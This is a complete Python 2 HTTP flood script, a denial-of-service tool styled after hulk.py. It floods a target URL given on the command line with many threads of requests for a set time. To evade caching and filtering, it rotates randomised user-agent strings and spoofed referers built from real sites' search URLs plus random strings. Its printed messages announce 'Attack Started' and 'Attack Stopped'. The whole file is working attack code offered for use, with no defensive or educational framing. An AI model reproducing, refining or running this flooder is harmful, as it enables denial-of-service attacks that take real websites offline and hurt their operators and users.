import sys
import time
import random
import urllib2
import threading

userAgents = [
	"Linux / Firefox 29: Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0",
	"Linux / Chrome 34: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
	"Mac / Firefox 29: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0",
	"Mac / Chrome 34: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
	"Mac / Safari 7: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
	"Windows / Firefox 29: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
	"Windows / Chrome 34: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
	"Windows / IE 6: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Windows / IE 7: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
	"Windows / IE 8: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
	"Windows / IE 9: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Windows / IE 10: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
	"Windows / IE 11: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Android / Firefox 29: Mozilla/5.0 (Android; Mobile; rv:29.0) Gecko/29.0 Firefox/29.0",
	"Android / Chrome 34: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36",
	"iOS / Chrome 34: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/34.0.1847.18 Mobile/11B554a Safari/9537.53",
	"iOS / Safari 7: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
	]

referers = [
	"https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
	"https://drive.google.com/viewerng/viewer?url=",
	"http://validator.w3.org/feed/check.cgi?url=",
	"http://host-tracker.com/check_page/?furl=",
	"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
	"http://jigsaw.w3.org/css-validator/validator?uri=",
	"https://add.my.yahoo.com/rss?url=",
	"http://www.google.com/?q=",
	"http://www.usatoday.com/search/results?q=",
	"http://engadget.search.aol.com/search?q=",
	"http://www.usatoday.com/search/results?q=",
	"http://engadget.search.aol.com/search?q=",
	"https://steamcommunity.com/market/search?q=",
	"http://filehippo.com/search?q=",
	"http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
	"http://eu.battle.net/wow/en/search?q=",
	"http://engadget.search.aol.com/search?q=",
	"http://careers.gatesfoundation.org/search?q=",
	"http://techtv.mit.edu/search?q=",
	"http://www.ustream.tv/search?q=",
	"http://www.ted.com/search?q=",
	"http://funnymama.com/search?q=",
	"http://itch.io/search?q=",
	"http://jobs.rbs.com/jobs/search?q=",
	"http://taginfo.openstreetmap.org/search?q=",
	"http://www.baoxaydung.com.vn/news/vn/search&q=",
	"https://play.google.com/store/search?q=",
	]

if len(sys.argv) < 5:
	print("Usage: %s [Target] [Method] [Threads] [Time(S)]" % (sys.argv[0]))
	exit()

ip = sys.argv[1]
method = sys.argv[2].upper()
threads = int(sys.argv[3])
timer = float(sys.argv[4])

request = urllib2.Request(ip)
request.get_method = lambda: method

timeout = time.time() + 1 * timer

print("[+] Attack Started on %s using method %s with %s threads for %s seconds" % (ip, method, threads, timer))

def buildblock(size): # Credit goes to hulk.py for this.
	out_str = ""
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def httpflooder():
	while time.time() < timeout:
		try:
			request.add_header("User-Agent", random.choice(userAgents))
			request.add_header("Accept", "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8")
			request.add_header("Accept-Language", "en-us, en;q=0.5")
			request.add_header("Accept-Encoding", "gzip, deflate")
			request.add_header("Accept-Charset", "ISO-8859-1, utf-8;q=0.7, *;q=0.7")
			request.add_header("Cache-Control", "no-cache")
			request.add_header("Referer", random.choice(referers) + buildblock(random.randint(5, 10)) + "=" + buildblock(random.randint(3, 10)))
			request.add_header("Keep-Alive", random.randint(110, 120))
			request.add_header("Connection", "keep-alive")
			urllib2.urlopen(request)
		except:
			pass
	return

for i in range(threads):
	thread = threading.Thread(target=httpflooder)
	thread.setDaemon(True)
	thread.start()

time.sleep(timer)
print("[-] Attack Stopped on %s" % (ip))
input("Press Enter to exit...")